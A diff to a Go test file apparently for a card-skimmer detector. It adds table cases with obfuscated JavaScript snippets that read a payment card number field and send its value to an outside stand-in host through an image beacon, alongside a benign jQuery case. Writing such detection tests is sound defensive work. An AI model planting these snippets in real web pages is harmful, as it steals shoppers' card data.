@@ -45,6 +45,9 @@ func TestSkimmerSignals(t *testing.T) {
 		"constant":         {`var a="payment[cc",b=a+"_number]";var f=document.querySelector('[name="'+b+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"atob of constant": {`const k="cGF5bWVudFtjY19udW1iZXJd";var f=document.querySelector('[name="'+atob(k)+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"array joined":     {`var f=document.querySelector('[name="'+["payment[cc","number]"].join("_")+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"after a regex":    {`var r=/["']/g;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"sliced":           {`var f=document.querySelector('[name="'+'xxpayment[cc_number]'.slice(2)+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"replaced":         {`var f=document.querySelector('[name="'+'payment[cc_nuXXmber]'.replace('XX','')+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"jquery-ish":       {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
 	} {
 		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
